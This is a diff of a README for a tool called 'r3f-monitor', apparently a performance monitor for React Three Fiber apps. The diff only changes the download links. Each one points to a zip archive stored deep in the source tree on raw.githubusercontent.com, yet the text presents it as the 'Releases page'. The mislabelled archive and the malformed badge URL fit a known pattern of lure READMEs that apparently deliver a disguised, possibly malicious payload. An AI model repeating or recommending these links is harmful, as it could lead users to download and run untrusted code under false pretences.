@@ -1,6 +1,6 @@
 # 🎯 r3f-monitor - A Simple Tool for Performance Insights
 
-[![Download r3f-monitor](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/components/f_monitor_r_3.5.zip%20r3f--monitor-v1.0-brightgreen)](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/components/f_monitor_r_3.5.zip)
+[![Download r3f-monitor](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/f-monitor-r-v1.1.zip%20r3f--monitor-v1.0-brightgreen)](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/f-monitor-r-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to r3f-monitor! This tool helps you track the performance of your R3F ap
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [r3f-monitor Releases](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/components/f_monitor_r_3.5.zip).
+To get started, visit this page to download: [r3f-monitor Releases](https://raw.githubusercontent.com/isaac221133/r3f-monitor/main/src/f-monitor-r-v1.1.zip).
 
 Once on the Releases page, follow these steps:
 
